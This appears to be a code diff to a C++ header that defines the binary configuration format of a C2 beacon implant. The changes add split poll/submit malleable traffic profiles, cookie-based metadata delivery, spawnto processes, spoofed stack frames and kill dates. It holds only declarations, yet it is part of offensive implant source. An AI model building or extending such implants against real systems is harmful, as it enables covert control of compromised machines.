@@ -18,15 +18,24 @@
 //
 // Payload layout:
 //   beacon_id[8] + crypto_key[32] + channel_count[1]
-//   per-channel: { header + strings + malleable_mode[1] + (inline malleable if 0x01) }
-//   sleep_ms[4] + jitter_pct[1] + kill_date[4] + options[2] + lazy_checkin_max[1] + reserved[1]
+//   per-channel: { header + strings +
+//                  poll_malleable_mode[1] + (inline poll malleable if 0x01) +
+//                  submit_malleable_mode[1] + (inline submit malleable if 0x01) +
+//                  poll_response_malleable_mode[1] + (inline poll response if 0x01) +
+//                  submit_response_malleable_mode[1] + (inline submit response if 0x01) }
+//   sleep_ms[4] + jitter_pct[1] + kill_date[4] + options[2] + lazy_checkin_max[1] + indirect_pivot_len[1]
 //   pad_max[2] + num_spoof_frames[2]
 //   spawnto_x64[1+len] + spawnto_x86[1+len]
-//   has_global_malleable[1] + (global malleable if 0x01)
+//   has_global_poll_malleable[1] + (global poll malleable if 0x01)
+//   has_global_submit_malleable[1] + (global submit malleable if 0x01)
+//   has_global_poll_response_malleable[1] + (global poll response if 0x01)
+//   has_global_submit_response_malleable[1] + (global submit response if 0x01)
 //   work_hours[6]
 //   stack_chain_count[2] + per-entry: module_len[1]+module_str + func_len[1]+func_str
 //
 // malleable_mode: 0x00 = use global, 0x01 = inline follows, 0xFF = none (TCP)
+// response_malleable_mode: same values, for S2B direction. Both directions
+// have split poll/submit profiles.
 // =============================================================================
 
 #define PCFG_VERSION_XCHACHA 0x0002
@@ -35,32 +44,47 @@
 // Binary Format Enums
 // =============================================================================
 
-enum PCFG_ChannelType : uint8_t {
-    PCFG_CHANNEL_NONE  = 0,
-    PCFG_CHANNEL_HTTP  = 1,
-    PCFG_CHANNEL_HTTPS = 2,
-    PCFG_CHANNEL_TCP   = 3,
-    PCFG_CHANNEL_PIPE  = 4  // Named pipe (SMB relay)
+// PCFG binary header (36 bytes): magic(4) + version(2) + reserved(2) + nonce(24) + ciphertext_len(4)
+#pragma pack(push, 1)
+struct PCFG_Header {
+    uint32_t magic;
+    uint16_t version;
+    uint16_t reserved;
+    uint8_t  nonce[24];
+    uint32_t ciphertext_len;
+};
+#pragma pack(pop)
+static_assert(sizeof(PCFG_Header) == 36, "PCFG_Header must be 36 bytes");
+
+enum class PCFG_ChannelType : uint8_t {
+    NONE  = 0,
+    HTTP  = 1,
+    HTTPS = 2,
+    TCP   = 3,
+    PIPE  = 4
 };
 
-constexpr uint8_t PCFG_HTTP_METHOD_GET  = 0; // TODO: rework as enum class PCFG_HTTP_METHOD
-constexpr uint8_t PCFG_HTTP_METHOD_POST = 1;
+enum class PCFG_HTTP_METHOD : uint8_t {
+    GET  = 0,
+    POST = 1
+};
 
-// Malleable mode byte (per channel)
-constexpr uint8_t PCFG_MALLEABLE_GLOBAL = 0x00;  // use global malleable
-constexpr uint8_t PCFG_MALLEABLE_INLINE = 0x01;  // inline malleable block follows
-constexpr uint8_t PCFG_MALLEABLE_NONE   = 0xFF;  // no malleable (TCP or bare)
+enum class PCFG_MALLEABLE_MODE : uint8_t {
+    GLOBAL = 0x00,
+    INLINE = 0x01,
+    NONE   = 0xFF
+};
 
-// Payload location types
-/* for HTTP types */
-constexpr uint8_t PCFG_LOCATION_QUERY_PARAM    = 0;
-constexpr uint8_t PCFG_LOCATION_PATH           = 1;
-constexpr uint8_t PCFG_LOCATION_BODY           = 2;
+enum class PCFG_LOCATION_TYPE : uint8_t {
+    QUERY_PARAM = 0,
+    PATH        = 1,
+    BODY        = 2
+};
 
-// Body content types
-/* For HTTP types */
-constexpr uint8_t PCFG_BODY_TEXT_PLAIN         = 0;
-constexpr uint8_t PCFG_BODY_OCTET_STREAM       = 1;
+enum class PCFG_BODY_CONTENT_TYPE : uint8_t {
+    TEXT_PLAIN   = 0,
+    OCTET_STREAM = 1
+};
 
 // =============================================================================
 // Linked List: HTTP Header
@@ -80,14 +104,16 @@ struct HTTP_header {
 // =============================================================================
 
 struct PayloadLocation {
-    uint8_t  type;              // PCFG_LOCATION_*
+    PCFG_LOCATION_TYPE  type;
     char*    param_name;        // query param name
     uint8_t  param_name_len;
     char*    path_prefix;       // path mode prefix
     uint8_t  path_prefix_len;
     char*    path_suffix;       // path mode suffix
     uint8_t  path_suffix_len;
-    uint8_t  body_content_type; // PCFG_BODY_*
+    PCFG_BODY_CONTENT_TYPE  body_content_type;
+    char*    cookie_name;       // cookie-based metadata delivery
+    uint8_t  cookie_name_len;
 };
 
 // =============================================================================
@@ -95,7 +121,7 @@ struct PayloadLocation {
 // =============================================================================
 
 struct PCFG_ChannelMalleable {
-    uint8_t       malleable_mode;  // PCFG_MALLEABLE_*
+    PCFG_MALLEABLE_MODE malleable_mode;
     char*         wrapper_prefix;
     uint16_t      wrapper_prefix_len;
     char*         wrapper_suffix;
@@ -110,14 +136,18 @@ struct PCFG_ChannelMalleable {
 // =============================================================================
 
 struct PCFG_C2Channel {
-    uint8_t   type;                      // PCFG_ChannelType
-    uint8_t   http_method;               // 0=GET, 1=POST
-    uint8_t   malleable_mode;            // PCFG_MALLEABLE_*
+    PCFG_ChannelType  type;
+    PCFG_MALLEABLE_MODE poll_malleable_mode;
+    PCFG_MALLEABLE_MODE submit_malleable_mode;
+    PCFG_MALLEABLE_MODE poll_response_malleable_mode;
+    PCFG_MALLEABLE_MODE submit_response_malleable_mode;
     uint16_t  port;
     char*     host;                      // malloc'd, null-terminated
     uint8_t   host_len;
-    char*     path;                      // malloc'd, null-terminated
-    uint8_t   path_len;
+    char*     poll_path;                 // GET path for poll operations (malloc'd)
+    uint8_t   poll_path_len;
+    char*     submit_path;               // POST path for submit operations (malloc'd)
+    uint8_t   submit_path_len;
     char*     user_agent;                // malloc'd, null-terminated
     uint8_t   ua_len;
     uint8_t   max_consecutive_failures;
@@ -202,13 +232,25 @@ struct BeaconConfig {
     uint8_t  spawnto_x86_len;
     char*    spawnto_x86;          // malloc'd, null-terminated
 
-    // Per-channel malleable configs (malloc'd array, indexed by channel index)
-    PCFG_ChannelMalleable* channel_malleable;  // malloc'd array of channel_count
+    // Per-channel poll/submit malleable configs (malloc'd arrays, indexed by channel index)
+    PCFG_ChannelMalleable* channel_poll_malleable;    // array of channel_count
+    PCFG_ChannelMalleable* channel_submit_malleable;  // array of channel_count
 
-    // Global malleable config (fallback for channels with malleable_mode == 0x00)
-    // Stored as a full PCFG_ChannelMalleable, never cast the whole BeaconConfig as one!
-    PCFG_ChannelMalleable global_malleable;
-    bool                  has_malleable_config;  // true if global_malleable was parsed
+    // Global malleable configs (fallback for channels with malleable_mode == 0x00)
+    PCFG_ChannelMalleable global_poll_malleable;
+    bool                  has_poll_malleable_config;
+    PCFG_ChannelMalleable global_submit_malleable;
+    bool                  has_submit_malleable_config;
+
+    // Per-channel response malleable configs (S2B direction, for response unwrapping)
+    PCFG_ChannelMalleable* channel_poll_response_malleable;
+    PCFG_ChannelMalleable* channel_submit_response_malleable;
+
+    // Global response malleable configs (fallback for channels with response_malleable_mode == 0x00)
+    PCFG_ChannelMalleable global_poll_response_malleable;
+    bool                  has_poll_response_malleable_config;
+    PCFG_ChannelMalleable global_submit_response_malleable;
+    bool                  has_submit_response_malleable_config;
 
     // Work Hours Configuration (6 bytes)
     WorkHoursConfig work_hours;
@@ -229,12 +271,21 @@ struct BeaconConfig {
 
 /**
  * Parse C2 channel from binary data (variable-length format)
- * Binary format: type(1) + http_method(1) + host_len(1) + path_len(1) + ua_len(1) +
- *                reserved(1) + port(2) + max_failures(1) + backoff_ms(4) + host + path + ua +
- *                malleable_mode(1) + (inline malleable if 0x01)
+ * Binary format: type(1) + host_len(1) + poll_path_len(1) + submit_path_len(1) + ua_len(1) +
+ *                reserved(1) + port(2) + max_failures(1) + backoff_ms(4) +
+ *                host + poll_path + submit_path + ua +
+ *                poll_malleable_mode(1) + (inline poll malleable if 0x01) +
+ *                submit_malleable_mode(1) + (inline submit malleable if 0x01) +
+ *                poll_response_malleable_mode(1) + (inline poll response if 0x01) +
+ *                submit_response_malleable_mode(1) + (inline submit response if 0x01)
  * @return Number of bytes consumed, or 0 on failure
  */
-size_t parseC2Channel(const uint8_t* data, size_t data_len, PCFG_C2Channel* channel, PCFG_ChannelMalleable* chMalleable);
+[[nodiscard]] size_t parseC2Channel(const uint8_t* data, size_t data_len,
+                                    PCFG_C2Channel* channel,
+                                    PCFG_ChannelMalleable* pollMalleable,
+                                    PCFG_ChannelMalleable* submitMalleable,
+                                    PCFG_ChannelMalleable* pollRespMalleable = nullptr,
+                                    PCFG_ChannelMalleable* submitRespMalleable = nullptr);
 
 /**
  * Parse complete config blob into BeaconConfig struct
@@ -242,7 +293,7 @@ size_t parseC2Channel(const uint8_t* data, size_t data_len, PCFG_C2Channel* chan
  * Allocates all string fields via __malloc. caller must freeConfig() on exit
  * @return true on success, false on failure
  */
-bool parseConfig(functionTable* funcTable, const uint8_t* blob, size_t blob_len, BeaconConfig* config);
+[[nodiscard]] bool parseConfig(functionTable* funcTable, const uint8_t* blob, size_t blob_len, BeaconConfig* config);
 
 /**
  * Free all dynamically allocated fields in BeaconConfig
